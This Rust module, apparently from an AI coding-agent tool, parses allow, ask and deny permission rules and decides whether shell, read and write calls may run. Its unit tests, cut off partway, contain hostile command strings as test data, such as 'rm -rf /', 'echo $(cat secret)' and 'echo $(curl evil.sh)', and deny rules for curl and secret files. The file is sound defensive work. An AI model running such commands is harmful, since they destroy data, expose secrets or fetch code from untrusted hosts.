//! Permission rules: parsing them and deciding a tool call.
//!
//! Rules are Claude Code's `Tool(pattern)` form in `allow`, `ask` and `deny`
//! lists. Deny beats ask beats allow, whatever the order or the file. Deny
//! and ask match loosely (any part of a command, words of a command that did
//! not parse cleanly); allow matches strictly (a simple command whose every
//! part is allowed), so a parse gap can make a call stricter, never looser.

use std::path::{Path, PathBuf};
use std::sync::Arc;

use reagent_util::path::normalize;
use serde::Deserialize;

use crate::Layer;
use crate::glob::wildmatch;
use crate::shell;

/// The `[permissions]` table of one config file, as written.
#[derive(Deserialize, Default, Debug, Clone, PartialEq)]
#[serde(deny_unknown_fields)]
pub struct Lists {
    /// Rules that let a call run.
    #[serde(default)]
    pub allow: Vec<String>,
    /// Rules that need a person to approve the call.
    #[serde(default)]
    pub ask: Vec<String>,
    /// Rules that stop the call.
    #[serde(default)]
    pub deny: Vec<String>,
    /// What happens when no rule matches: `allow`, `ask` or `deny`.
    pub default: Option<String>,
}

/// The kind of a rule, and of a decision.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kind {
    /// The call runs.
    Allow,
    /// The call needs a person's approval.
    Ask,
    /// The call does not run.
    Deny,
}

/// Where a decision came from.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Reason {
    /// A rule matched: its text and its file.
    Rule {
        /// The rule as written, such as `Bash(git push:*)`.
        rule: Arc<str>,
        /// The config file that holds it.
        file: Arc<str>,
    },
    /// No rule matched and the default decided.
    Default,
}

/// The decision for one call.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Decision {
    /// What to do with the call.
    pub kind: Kind,
    /// Why.
    pub reason: Reason,
}

/// One tool call, as the rules see it.
#[derive(Debug, Clone, Copy)]
pub struct Call<'a> {
    /// The tool name.
    pub tool: &'a str,
    /// The name of the tool's main argument (`command`, `path`), if any.
    pub main_arg: Option<&'a str>,
    /// That argument's value in this call, if present.
    pub value: Option<&'a str>,
    /// The paths the call reads, joined to the tool's folder.
    pub reads: &'a [PathBuf],
    /// The paths the call writes, joined to the tool's folder.
    pub writes: &'a [PathBuf],
}

/// The rules of all config files, ready to decide calls.
#[derive(Debug, Clone)]
pub struct Rules {
    rules: Vec<Rule>,
    default: Kind,
    cwd: PathBuf,
    home: Option<PathBuf>,
}

#[derive(Debug, Clone)]
struct Rule {
    kind: Kind,
    tool: Tool,
    pattern: Option<Pattern>,
    /// The pattern as a path glob, built once: anchored to the working
    /// folder or home, or `name` only. `None` for a `~/` glob with no home.
    path: Option<PathGlob>,
    text: Arc<str>,
    file: Arc<str>,
}

#[derive(Debug, Clone)]
struct PathGlob {
    glob: Box<[u8]>,
    /// A pattern with no `/` matches the file name at any depth.
    name_only: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum Tool {
    Any,
    /// `Read(...)`: every path a call reads.
    ReadEffect,
    /// `Edit(...)`: every path a call writes.
    EditEffect,
    Named(String),
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum Pattern {
    /// `git push:*`: the words a command part starts with.
    Prefix(Vec<String>),
    /// Any other text: a glob over the value, `*` crossing `/`.
    Glob(String),
}

impl Rules {
    /// No rules: every call is allowed.
    pub fn none() -> Self {
        Self {
            rules: Vec::new(),
            default: Kind::Allow,
            cwd: PathBuf::new(),
            home: None,
        }
    }

    /// Parses the rules of every layer. `cwd` anchors relative path patterns
    /// and `home` expands `~/`. A bad rule or default is an error that names
    /// the file and the rule.
    pub fn from_layers(layers: &[Layer], cwd: &Path, home: Option<&Path>) -> Result<Self, String> {
        let mut rules = Vec::new();
        let mut default = Kind::Allow;
        for layer in layers {
            let file: Arc<str> = Arc::from(layer.path.display().to_string());
            let lists = &layer.settings.permissions;
            for (kind, list) in [
                (Kind::Allow, &lists.allow),
                (Kind::Ask, &lists.ask),
                (Kind::Deny, &lists.deny),
            ] {
                for text in list {
                    let mut rule = parse_rule(kind, text, &file)
                        .map_err(|error| format!("{file}: rule {text:?}: {error}"))?;
                    if let Some(Pattern::Glob(glob)) = &rule.pattern {
                        let built = path_glob(glob, &normalize(cwd), home)
                            .map_err(|error| format!("{file}: rule {text:?}: {error}"))?;
                        rule.path = Some(built);
                    }
                    rules.push(rule);
                }
            }
            if let Some(name) = &lists.default {
                default = match name.as_str() {
                    "allow" => Kind::Allow,
                    "ask" => Kind::Ask,
                    "deny" => Kind::Deny,
                    other => {
                        return Err(format!(
                            "{file}: permissions.default must be allow, ask or deny, not {other:?}"
                        ));
                    }
                };
            }
        }
        Ok(Self {
            rules,
            default,
            cwd: normalize(cwd),
            home: home.map(normalize),
        })
    }

    /// Whether no rule is set and the default allows, so every call runs.
    pub fn is_open(&self) -> bool {
        self.rules.is_empty() && self.default == Kind::Allow
    }

    /// Decides `call`: deny over ask over allow, else the default.
    pub fn decide(&self, call: &Call<'_>) -> Decision {
        if self.is_open() {
            return Decision {
                kind: Kind::Allow,
                reason: Reason::Default,
            };
        }
        // No rule names this tool and no Read or Edit rule could see the call:
        // the default decides, and parsing the command would only cost time.
        if !self.touches(call.tool) {
            return Decision {
                kind: self.default,
                reason: Reason::Default,
            };
        }
        let command = (call.main_arg == Some("command"))
            .then_some(call.value)
            .flatten()
            .map(shell::parse);
        // The words of each command part joined and the raw text tokenised are
        // the same for every rule, so they are built once here.
        let globs = self.has_glob();
        let mut view = View {
            call,
            command: command.as_ref(),
            nested: Vec::new(),
            reads: call
                .reads
                .iter()
                .map(|p| ViewPath::new(self.absolute(&self.cwd, p)))
                .collect(),
            writes: call
                .writes
                .iter()
                .map(|p| ViewPath::new(self.absolute(&self.cwd, p)))
                .collect(),
            words: Vec::new(),
            unknown_target: false,
            parts: Vec::new(),
            raw: None,
            main_path: None,
        };
        if let Some(command) = &command {
            // Scripts handed to another program (`sudo sh -c '...'`,
            // `xargs sh -c`, `eval '...'`): deny and ask look inside them.
            nested_commands(command, 2, &mut view.nested);
            self.resolve(command, &mut view);
            for inner in std::mem::take(&mut view.nested) {
                self.resolve(&inner, &mut view);
                view.nested.push(inner);
            }
            if globs {
                let mut parts = Vec::with_capacity(command.parts.len());
                parts.extend(command.parts.iter().map(PartText::new));
                for inner in &view.nested {
                    parts.extend(inner.parts.iter().map(PartText::new));
                }
                view.parts = parts;
            }
            if command.complex {
                view.raw = call.value.map(RawText::new);
            }
        }
        if globs
            && call.main_arg == Some("path")
            && let Some(value) = call.value
        {
            view.main_path = Some(ViewPath::new(self.absolute(&self.cwd, Path::new(value))));
        }
        for kind in [Kind::Deny, Kind::Ask] {
            if let Some(rule) = self
                .rules
                .iter()
                .filter(|rule| rule.kind == kind)
                .find(|rule| self.matches_loosely(rule, &view))
            {
                return rule.decision();
            }
        }
        if let Some(rule) = self.allowed_by(&view) {
            return rule.decision();
        }
        Decision {
            kind: self.default,
            reason: Reason::Default,
        }
    }

    /// Whether a rule could decide a call of this tool: it names the tool, or
    /// it sees the paths a call reads or writes.
    fn touches(&self, tool: &str) -> bool {
        self.rules.iter().any(|rule| {
            matches!(rule.tool, Tool::ReadEffect | Tool::EditEffect) || rule.tool.covers(tool)
        })
    }

    /// Whether a rule has a glob pattern, the only pattern that reads the
    /// joined words of a command part and the `path` value as a path.
    fn has_glob(&self) -> bool {
        self.rules
            .iter()
            .any(|rule| matches!(rule.pattern, Some(Pattern::Glob(_))))
    }

    /// Whether any rule needs the paths a call reads or writes.
    pub fn needs_effects(&self) -> bool {
        self.rules
            .iter()
            .any(|rule| matches!(rule.tool, Tool::ReadEffect | Tool::EditEffect))
    }

    /// The tool names the rules name, other than `*`, `Read` and `Edit`, so
    /// a caller can refuse a name no tool has: a typo would make a deny do
    /// nothing.
    pub fn tool_names(&self) -> impl Iterator<Item = (&str, &str, &str)> {
        self.rules.iter().filter_map(|rule| match &rule.tool {
            Tool::Named(name) => Some((name.as_str(), rule.text.as_ref(), rule.file.as_ref())),
            _ => None,
        })
    }

    fn absolute(&self, dir: &Path, path: &Path) -> PathBuf {
        normalize(&dir.join(path))
    }

    /// Adds the reads, writes and path-like words of `command`, following a
    /// literal `cd` so later relative targets resolve where they will run.
    fn resolve(&self, command: &shell::Command<'_>, view: &mut View<'_>) {
        let want_words = self.needs_effects();
        let mut dir = Some(self.cwd.clone());
        for part in &command.parts {
            let program = part.words.first().map(|w| shell::program_name(w));
            if matches!(program, Some("cd" | "pushd" | "popd")) {
                let target = part.words.iter().skip(1).find(|w| !w.starts_with('-'));
                dir = match (program, target, &dir) {
                    (Some("popd"), _, _) | (_, _, None) => None,
                    (_, None, _) => self.home.clone(),
                    (_, Some(target), Some(at)) => self.target(at, target),
                };
                continue;
            }
            for (list, is_write) in [(&part.reads, false), (&part.writes, true)] {
                for target in list {
                    match dir.as_ref().and_then(|at| self.target(at, target)) {
                        Some(path) if is_write => view.writes.push(ViewPath::new(path)),
                        Some(path) => view.reads.push(ViewPath::new(path)),
                        None => view.unknown_target = true,
                    }
                }
            }
            if want_words && let Some(at) = &dir {
                for word in part.words.iter().skip(1).filter(|w| !w.starts_with('-')) {
                    if let Some(path) = self.target(at, word) {
                        view.words.push(ViewPath::new(path));
                    }
                }
            }
        }
    }

    /// A target text as a path from `dir`: `~/` and `$HOME/` mean home; any
    /// other expansion makes it unknown.
    fn target(&self, dir: &Path, text: &str) -> Option<PathBuf> {
        let home_rest = text
            .strip_prefix("~/")
            .or_else(|| text.strip_prefix("$HOME/"))
            .or_else(|| text.strip_prefix("${HOME}/"));
        if let Some(rest) = home_rest {
            return Some(normalize(&self.home.as_ref()?.join(rest)));
        }
        if matches!(text, "~" | "$HOME" | "${HOME}") {
            return self.home.clone();
        }
        if text.contains(['$', '`', '{', '*', '?', '[']) {
            return None;
        }
        Some(self.absolute(dir, Path::new(text)))
    }

    /// A deny or ask match: any part, any path, any word.
    fn matches_loosely(&self, rule: &Rule, view: &View<'_>) -> bool {
        match &rule.tool {
            Tool::ReadEffect => {
                self.any_path(rule, &view.reads)
                    || self.any_path(rule, &view.words)
                    || view
                        .reads
                        .iter()
                        .any(|folder| self.rule_below(rule, folder))
            }
            Tool::EditEffect => {
                view.unknown_target
                    || self.any_path(rule, &view.writes)
                    || self.any_path(rule, &view.words)
            }
            tool => {
                if !tool.covers(view.call.tool) {
                    return false;
                }
                let Some(pattern) = &rule.pattern else {
                    return true;
                };
                match (view.command, view.call.value) {
                    (Some(command), _) => {
                        command.unknown_program
                            || (command.parts.is_empty() && pattern.is_star())
                            || std::iter::once(command)
                                .chain(&view.nested)
                                .flat_map(|c| &c.parts)
                                .enumerate()
                                .any(|(at, part)| {
                                    pattern.matches_part_loosely(part, view.parts.get(at))
                                })
                            || view
                                .raw
                                .as_ref()
                                .is_some_and(|raw| pattern.found_in_text(raw))
                    }
                    (None, Some(_)) => self.matches_value(pattern, rule.path.as_ref(), view),
                    (None, None) => false,
                }
            }
        }
    }

    /// The allow rule that lets the call run, if every piece of it is
    /// allowed: each command part by some rule, each path by some rule.
    fn allowed_by<'r>(&'r self, view: &View<'_>) -> Option<&'r Rule> {
        let allows = || self.rules.iter().filter(|rule| rule.kind == Kind::Allow);
        // A bare rule for the tool allows every call of it.
        if let Some(rule) = allows().find(|rule| {
            rule.pattern.is_none()
                && !matches!(rule.tool, Tool::ReadEffect | Tool::EditEffect)
                && rule.tool.covers(view.call.tool)
        }) {
            return Some(rule);
        }
        let by_arg = || {
            allows().filter(|rule| {
                rule.pattern.is_some()
                    && !matches!(rule.tool, Tool::ReadEffect | Tool::EditEffect)
                    && rule.tool.covers(view.call.tool)
            })
        };
        if let Some(command) = view.command {
            if command.complex
                || command.unknown_program
                || command.parts.is_empty()
                || view.unknown_target
            {
                return None;
            }
            let mut first = None;
            for (at, part) in command.parts.iter().enumerate() {
                let rule = by_arg().find(|rule| {
                    rule.pattern.as_ref().is_some_and(|pattern| {
                        pattern.matches_part_strictly(part, view.parts.get(at))
                    })
                })?;
                first.get_or_insert(rule);
            }
            // Redirect targets are writes, so they need an Edit allow too.
            if !view.writes.is_empty() && !self.all_paths_allowed(&view.writes, Tool::EditEffect) {
                return None;
            }
            return first;
        }
        if view.call.value.is_some()
            && let Some(rule) = by_arg().find(|rule| {
                rule.pattern
                    .as_ref()
                    .is_some_and(|pattern| self.matches_value(pattern, rule.path.as_ref(), view))
            })
        {
            return Some(rule);
        }
        // Effect rules allow a call whose every effect they cover.
        if view.reads.is_empty() && view.writes.is_empty() {
            return None;
        }
        if self.all_paths_allowed(&view.reads, Tool::ReadEffect)
            && self.all_paths_allowed(&view.writes, Tool::EditEffect)
        {
            return allows().find(|rule| {
                matches!(rule.tool, Tool::ReadEffect | Tool::EditEffect)
                    && view
                        .reads
                        .iter()
                        .chain(&view.writes)
                        .any(|path| self.path_matches(rule, path))
            });
        }
        None
    }

    fn all_paths_allowed(&self, paths: &[ViewPath], effect: Tool) -> bool {
        paths.iter().all(|path| {
            self.rules.iter().any(|rule| {
                rule.kind == Kind::Allow && rule.tool == effect && self.path_matches(rule, path)
            })
        })
    }

    fn any_path(&self, rule: &Rule, paths: &[ViewPath]) -> bool {
        paths.iter().any(|path| self.path_matches(rule, path))
    }

    /// A bare effect rule covers every path; a pattern is a gitignore-style
    /// glob that also covers everything below a match.
    fn path_matches(&self, rule: &Rule, path: &ViewPath) -> bool {
        match (&rule.pattern, &rule.path) {
            (None, _) => true,
            (Some(Pattern::Glob(_)), Some(glob)) => glob.matches(path.bytes()),
            _ => false,
        }
    }

    /// Whether the rule's pattern names a place below `folder`, so a search
    /// of the folder would read it.
    fn rule_below(&self, rule: &Rule, folder: &ViewPath) -> bool {
        match (&rule.pattern, &rule.path) {
            (None, _) => true,
            (Some(Pattern::Glob(_)), Some(glob)) => glob.below(folder.bytes()),
            _ => false,
        }
    }

    fn matches_value(
        &self,
        pattern: &Pattern,
        rule_path: Option<&PathGlob>,
        view: &View<'_>,
    ) -> bool {
        let Some(value) = view.call.value else {
            return false;
        };
        match pattern {
            Pattern::Glob(_) if view.call.main_arg == Some("path") => view
                .main_path
                .as_ref()
                .is_some_and(|path| rule_path.is_some_and(|glob| glob.matches(path.bytes()))),
            Pattern::Glob(glob) => glob_any(glob.as_bytes(), value.as_bytes()),
            Pattern::Prefix(words) => {
                let mut given = value.split_whitespace();
                words.iter().all(|word| given.next() == Some(word.as_str()))
            }
        }
    }
}

struct View<'a> {
    call: &'a Call<'a>,
    command: Option<&'a shell::Command<'a>>,
    nested: Vec<shell::Command<'static>>,
    reads: Vec<ViewPath>,
    writes: Vec<ViewPath>,
    /// Path-like words of command parts, for loose Read and Edit rules.
    words: Vec<ViewPath>,
    /// A redirect target or a `cd` that could not be resolved.
    unknown_target: bool,
    /// The joined words of every command part, the command's first and then
    /// those of the nested commands, in the order the parts are walked. Empty
    /// when no rule has a glob pattern, the only pattern that reads them.
    parts: Vec<PartText>,
    /// The raw command with quotes and backslashes dropped and its tokens,
    /// for a command that did not parse cleanly.
    raw: Option<RawText>,
    /// The `path` value as a path from the working folder.
    main_path: Option<ViewPath>,
}

/// One command part's words joined by one space, and the byte offset where
/// each of them starts, so no rule has to join them again.
struct PartText {
    joined: String,
    starts: Vec<usize>,
}

impl PartText {
    fn new(part: &shell::Part<'_>) -> Self {
        let joined = join(&part.words);
        let mut starts = vec![0];
        starts.extend(joined.match_indices(' ').map(|(at, _)| at + 1));
        Self { joined, starts }
    }
}

/// A command line that did not parse cleanly, as the loose matcher reads it:
/// its text without quotes and backslashes, and the byte range of each token,
/// built once for every rule.
struct RawText {
    plain: String,
    tokens: Vec<(usize, usize)>,
}

impl RawText {
    fn new(raw: &str) -> Self {
        let plain: String = raw
            .chars()
            .filter(|c| !matches!(c, '\'' | '"' | '\\'))
            .collect();
        let mut tokens = Vec::new();
        let mut start = None;
        for (at, c) in plain.char_indices() {
            if c.is_whitespace() || "`$();&|<>{}".contains(c) {
                if let Some(from) = start.take() {
                    tokens.push((from, at));
                }
            } else if start.is_none() {
                start = Some(at);
            }
        }
        if let Some(from) = start {
            tokens.push((from, plain.len()));
        }
        Self { plain, tokens }
    }

    /// The token at `at`.
    fn token(&self, at: usize) -> &str {
        let (from, to) = self.tokens[at];
        &self.plain[from..to]
    }
}

/// A path as the rules see it: absolute, and folded to lower case on macOS,
/// where the file system ignores case and the globs are lowered too.
struct ViewPath {
    path: PathBuf,
    /// The path bytes in lower case, empty where case matters.
    folded: Vec<u8>,
}

impl ViewPath {
    fn new(path: PathBuf) -> Self {
        let folded = if cfg!(target_os = "macos") {
            path.as_os_str().as_encoded_bytes().to_ascii_lowercase()
        } else {
            Vec::new()
        };
        Self { path, folded }
    }

    /// The bytes a path glob matches against.
    fn bytes(&self) -> &[u8] {
        if cfg!(target_os = "macos") {
            &self.folded
        } else {
            self.path.as_os_str().as_encoded_bytes()
        }
    }
}

/// The commands inside words that hold a command line, `depth` levels deep.
fn nested_commands(
    command: &shell::Command<'_>,
    depth: u8,
    out: &mut Vec<shell::Command<'static>>,
) {
    if depth == 0 {
        return;
    }
    for word in command
        .parts
        .iter()
        .flat_map(|part| part.words.iter().skip(1))
    {
        if shell::shell_text(word) {
            let inner = owned(shell::parse(word));
            nested_commands(&inner, depth - 1, out);
            out.push(inner);
        }
    }
}

fn owned(command: shell::Command<'_>) -> shell::Command<'static> {
    let own = |list: Vec<std::borrow::Cow<'_, str>>| {
        list.into_iter()
            .map(|word| std::borrow::Cow::Owned(word.into_owned()))
            .collect()
    };
    shell::Command {
        parts: command
            .parts
            .into_iter()
            .map(|part| shell::Part {
                words: own(part.words),
                writes: own(part.writes),
                reads: own(part.reads),
            })
            .collect(),
        complex: command.complex,
        unknown_program: command.unknown_program,
    }
}

impl Rule {
    fn decision(&self) -> Decision {
        Decision {
            kind: self.kind,
            reason: Reason::Rule {
                rule: Arc::clone(&self.text),
                file: Arc::clone(&self.file),
            },
        }
    }
}

impl Tool {
    fn covers(&self, name: &str) -> bool {
        match self {
            Tool::Any => true,
            Tool::Named(rule) => rule.eq_ignore_ascii_case(name),
            Tool::ReadEffect | Tool::EditEffect => false,
        }
    }
}

/// Whether two program names are the same. On macOS the file system ignores
/// case, so `GIT` runs git.
fn same_program(a: &str, b: &str) -> bool {
    if cfg!(target_os = "macos") {
        a.eq_ignore_ascii_case(b)
    } else {
        a == b
    }
}

impl Pattern {
    fn is_star(&self) -> bool {
        matches!(self, Pattern::Glob(glob) if glob.trim() == "*")
    }

    /// The allow match: the part's words start with the rule's words, the
    /// program exactly as written in the rule.
    fn matches_part_strictly(&self, part: &shell::Part<'_>, text: Option<&PartText>) -> bool {
        match self {
            Pattern::Prefix(want) => {
                part.words.len() >= want.len()
                    && want
                        .iter()
                        .zip(&part.words)
                        .all(|(want, have)| have.as_ref() == want)
            }
            Pattern::Glob(glob) => {
                let built;
                let text = match text {
                    Some(text) => text,
                    None => {
                        built = PartText::new(part);
                        &built
                    }
                };
                glob_words(glob, &text.joined)
            }
        }
    }

    /// The deny and ask match: from any word on, the program by its name in
    /// any path, options skipped between the rule's words.
    fn matches_part_loosely(&self, part: &shell::Part<'_>, text: Option<&PartText>) -> bool {
        match self {
            Pattern::Prefix(want) => (0..part.words.len()).any(|start| {
                let mut have = part.words[start..].iter();
                let Some(first) = have.next() else {
                    return false;
                };
                if !same_program(shell::program_name(first), &want[0])
                    && !same_program(first, &want[0])
                {
                    return false;
                }
                let mut have = have.peekable();
                want[1..].iter().all(|want| {
                    loop {
                        match have.next() {
                            Some(word) if word.as_ref() == want => break true,
                            // `git -C . push`: an option, and for a short option
                            // its value, may come between the rule's words.
                            Some(word) if word.starts_with('-') => {
                                if word.len() == 2
                                    && have.peek().is_some_and(|next| next.as_ref() != want)
                                {
                                    have.next();
                                }
                            }
                            _ => break false,
                        }
                    }
                })
            }),
            Pattern::Glob(glob) => {
                let built;
                let text = match text {
                    Some(text) => text,
                    None => {
                        built = PartText::new(part);
                        &built
                    }
                };
                let joined = &text.joined;
                text.starts.iter().any(|&at| {
                    let rest = &joined[at..];
                    let program_end = rest.find(' ').unwrap_or(rest.len());
                    let program = &rest[..program_end];
                    let short = shell::program_name(program);
                    glob_words(glob, rest)
                        || (short.len() != program.len()
                            && glob_words(glob, &format!("{short}{}", &rest[program_end..])))
                })
            }
        }
    }

    /// Whether the rule's words occur in a row in a raw command line, for a
    /// command that did not parse cleanly. Quotes and backslashes are removed
    /// first, so `g'i't push` is `git push`.
    fn found_in_text(&self, raw: &RawText) -> bool {
        let words = match self {
            Pattern::Prefix(words) => Words::Prefix(words),
            Pattern::Glob(glob) => Words::Glob(glob),
        };
        let count = words.count();
        if count == 0 || raw.tokens.len() < count {
            return false;
        }
        (0..=raw.tokens.len() - count).any(|start| {
            (0..count).all(|at| match words.get(at) {
                Some(want) => {
                    let have = raw.token(start + at);
                    same_program(have, want)
                        || (at == 0 && same_program(shell::program_name(have), want))
                }
                None => false,
            })
        })
    }
}

/// The words a rule looks for in a raw command line, read without building a
/// list of them for every rule.
enum Words<'a> {
    /// A `words:*` rule: its words.
    Prefix(&'a [String]),
    /// A glob rule: its words up to the first wildcard.
    Glob(&'a str),
}

impl Words<'_> {
    /// The `at`th word, if the rule has that many.
    fn get(&self, at: usize) -> Option<&str> {
        match self {
            Words::Prefix(words) => words.get(at).map(String::as_str),
            Words::Glob(glob) => glob
                .split_whitespace()
                .take_while(|word| !word.contains(['*', '?', '[']))
                .nth(at),
        }
    }

    /// How many words the rule looks for.
    fn count(&self) -> usize {
        match self {
            Words::Prefix(words) => words.len(),
            Words::Glob(glob) => glob
                .split_whitespace()
                .take_while(|word| !word.contains(['*', '?', '[']))
                .count(),
        }
    }
}

fn join(words: &[std::borrow::Cow<'_, str>]) -> String {
    let mut out = String::with_capacity(words.iter().map(|w| w.len() + 1).sum());
    for (at, word) in words.iter().enumerate() {
        if at > 0 {
            out.push(' ');
        }
        out.push_str(word);
    }
    out
}

/// A glob over joined words; a trailing ` *` also matches no more words, so
/// `git push *` matches a bare `git push`.
fn glob_words(glob: &str, text: &str) -> bool {
    glob_any(glob.as_bytes(), text.as_bytes())
        || glob
            .strip_suffix(" *")
            .is_some_and(|head| glob_any(head.as_bytes(), text.as_bytes()))
}

/// Builds the path glob of a pattern: a trailing `/` means everything below,
/// a pattern with no `/` matches a name, `~/` is anchored to `home`, a
/// relative one to `cwd`, and `..` is resolved. On macOS it ignores case.
fn path_glob(glob: &str, cwd: &Path, home: Option<&Path>) -> Result<PathGlob, String> {
    let glob = glob.strip_suffix('/').unwrap_or(glob);
    if !glob.contains('/') {
        return Ok(PathGlob::new(glob.to_owned(), true));
    }
    let anchored = if let Some(rest) = glob.strip_prefix("~/") {
        let home = home.ok_or("`~/` needs HOME, which is not set")?;
        home.join(rest)
    } else if glob.starts_with('/') {
        PathBuf::from(glob)
    } else {
        cwd.join(glob.trim_start_matches("./"))
    };
    Ok(PathGlob::new(
        normalize(&anchored).to_string_lossy().into_owned(),
        false,
    ))
}

impl PathGlob {
    fn new(glob: String, name_only: bool) -> Self {
        let glob = if cfg!(target_os = "macos") {
            glob.to_ascii_lowercase()
        } else {
            glob
        };
        Self {
            glob: glob.into_bytes().into(),
            name_only,
        }
    }

    /// Whether `bytes` or any folder above it matches; a name pattern matches
    /// any part of the path. The bytes are folded to lower case on macOS,
    /// where the glob is lowered too.
    fn matches(&self, bytes: &[u8]) -> bool {
        if self.name_only {
            return bytes
                .split(|b| *b == b'/')
                .any(|part| !part.is_empty() && wildmatch(&self.glob, part));
        }
        let mut end = bytes.len();
        loop {
            if end > 0 && wildmatch(&self.glob, &bytes[..end]) {
                return true;
            }
            match bytes[..end].iter().rposition(|b| *b == b'/') {
                Some(0) | None => return false,
                Some(at) => end = at,
            }
        }
    }

    /// Whether a match could lie below `folder`: the pattern's literal head
    /// starts inside it. A name pattern could match anywhere, but blocking
    /// every search for it would make search useless, so it does not count.
    fn below(&self, folder: &[u8]) -> bool {
        if self.name_only {
            return false;
        }
        let head_len = self
            .glob
            .iter()
            .position(|b| matches!(b, b'*' | b'?' | b'[' | b'\\'))
            .unwrap_or(self.glob.len());
        let head = &self.glob[..head_len];
        head.starts_with(folder)
            && (head.len() == folder.len() || head.get(folder.len()) == Some(&b'/'))
            || folder == b"/"
    }
}

fn parse_rule(kind: Kind, text: &str, file: &Arc<str>) -> Result<Rule, String> {
    let text = text.trim();
    let (name, pattern) = match text.split_once('(') {
        Some((name, rest)) => {
            let inner = rest
                .strip_suffix(')')
                .ok_or("a pattern must end with `)`")?;
            if inner.is_empty() {
                return Err("an empty pattern; write the tool name alone".into());
            }
            (name.trim(), Some(inner))
        }
        None => (text, None),
    };
    if name.is_empty()
        || !name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "_-*.".contains(c))
    {
        return Err("a rule must start with a tool name".into());
    }
    let tool = if name == "*" {
        Tool::Any
    } else if name.eq_ignore_ascii_case("read") {
        Tool::ReadEffect
    } else if name.eq_ignore_ascii_case("edit") {
        Tool::EditEffect
    } else {
        Tool::Named(name.to_ascii_lowercase())
    };
    let pattern = pattern
        .map(str::trim)
        .map(|inner| match inner.strip_suffix(":*") {
            Some(prefix) => Pattern::Prefix(prefix.split_whitespace().map(str::to_owned).collect()),
            None => Pattern::Glob(inner.to_owned()),
        });
    if matches!(&pattern, Some(Pattern::Prefix(words)) if words.is_empty()) {
        return Err("`:*` needs words before it".into());
    }
    if matches!(tool, Tool::ReadEffect | Tool::EditEffect)
        && matches!(pattern, Some(Pattern::Prefix(_)))
    {
        return Err("Read and Edit take a path pattern, not `:*`".into());
    }
    Ok(Rule {
        kind,
        tool,
        pattern,
        path: None,
        text: Arc::from(text),
        file: Arc::clone(file),
    })
}

/// A glob where `*` matches any run of characters, `/` included, and `?`
/// one character.
fn glob_any(pattern: &[u8], text: &[u8]) -> bool {
    let (mut p, mut t) = (0, 0);
    let (mut star, mut mark) = (None, 0);
    while t < text.len() {
        if p < pattern.len() && (pattern[p] == b'?' || pattern[p] == text[t]) {
            p += 1;
            t += 1;
        } else if p < pattern.len() && pattern[p] == b'*' {
            star = Some(p);
            mark = t;
            p += 1;
        } else if let Some(at) = star {
            p = at + 1;
            mark += 1;
            t = mark;
        } else {
            return false;
        }
    }
    while p < pattern.len() && pattern[p] == b'*' {
        p += 1;
    }
    p == pattern.len()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::Settings;

    fn rules(allow: &[&str], ask: &[&str], deny: &[&str], default: Option<&str>) -> Rules {
        let lists = Lists {
            allow: allow.iter().map(|s| s.to_string()).collect(),
            ask: ask.iter().map(|s| s.to_string()).collect(),
            deny: deny.iter().map(|s| s.to_string()).collect(),
            default: default.map(str::to_owned),
        };
        let layer = Layer {
            path: PathBuf::from("/home/u/.config/reagent/config.toml"),
            settings: Settings {
                permissions: lists,
                ..Settings::default()
            },
        };
        Rules::from_layers(&[layer], Path::new("/work"), Some(Path::new("/home/u"))).unwrap()
    }

    fn bash(rules: &Rules, command: &str) -> Kind {
        rules
            .decide(&Call {
                tool: "bash",
                main_arg: Some("command"),
                value: Some(command),
                reads: &[],
                writes: &[],
            })
            .kind
    }

    fn write(rules: &Rules, path: &str) -> Kind {
        let writes = [PathBuf::from(path)];
        rules
            .decide(&Call {
                tool: "write",
                main_arg: Some("path"),
                value: Some(path),
                reads: &[],
                writes: &writes,
            })
            .kind
    }

    #[test]
    fn deny_beats_allow_whatever_the_order() {
        let r = rules(&["Bash(git:*)"], &[], &["Bash(git push:*)"], None);
        assert_eq!(bash(&r, "git push origin main"), Kind::Deny);
        assert_eq!(bash(&r, "git status"), Kind::Allow);
        let decision = r.decide(&Call {
            tool: "Bash",
            main_arg: Some("command"),
            value: Some("git push"),
            reads: &[],
            writes: &[],
        });
        assert_eq!(
            decision.reason,
            Reason::Rule {
                rule: Arc::from("Bash(git push:*)"),
                file: Arc::from("/home/u/.config/reagent/config.toml"),
            }
        );
    }

    #[test]
    fn ask_beats_allow_and_deny_beats_ask() {
        let r = rules(&["Bash"], &["Bash(rm:*)"], &["Bash(rm -rf /:*)"], None);
        assert_eq!(bash(&r, "rm build"), Kind::Ask);
        assert_eq!(bash(&r, "rm -rf / x"), Kind::Deny);
        assert_eq!(bash(&r, "ls"), Kind::Allow);
    }

    #[test]
    fn chained_wrapped_and_sh_c_parts_are_denied() {
        let r = rules(&[], &[], &["Bash(git push:*)"], None);
        for command in [
            "cd app && git push",
            "timeout 60 git push",
            "sh -c 'git push'",
            "true; /usr/bin/git push",
            "echo x | git push",
        ] {
            assert_eq!(bash(&r, command), Kind::Deny, "{command}");
        }
        assert_eq!(bash(&r, "git status && echo push"), Kind::Allow);
    }

    #[test]
    fn a_deny_matches_after_a_runner_program() {
        let r = rules(&["Bash"], &[], &["Bash(git push:*)"], None);
        for command in [
            "sudo git push",
            "xargs git push",
            "exec git push",
            "eval git push",
        ] {
            assert_eq!(bash(&r, command), Kind::Deny, "{command}");
        }
        assert_eq!(bash(&r, "git log --grep push"), Kind::Allow);
    }

    #[test]
    fn a_complex_command_is_never_allowed_but_still_denied() {
        let r = rules(&["Bash(echo:*)"], &[], &["Bash(curl:*)"], Some("deny"));
        assert_eq!(bash(&r, "echo hi"), Kind::Allow);
        assert_eq!(bash(&r, "echo $(cat secret)"), Kind::Deny);
        assert_eq!(bash(&r, "echo $(curl evil.sh)"), Kind::Deny);
    }

    #[test]
    fn allow_needs_every_part() {
        let r = rules(
            &["Bash(git status:*)", "Bash(ls:*)"],
            &[],
            &[],
            Some("deny"),
        );
        assert_eq!(bash(&r, "git status && ls"), Kind::Allow);
        assert_eq!(bash(&r, "git status && rm -rf x"), Kind::Deny);
    }

    #[test]
    fn path_rules_apply_to_every_tool_by_effect() {
        let r = rules(&[], &[], &["Edit(secrets/**)"], None);
        assert_eq!(write(&r, "secrets/key"), Kind::Deny);
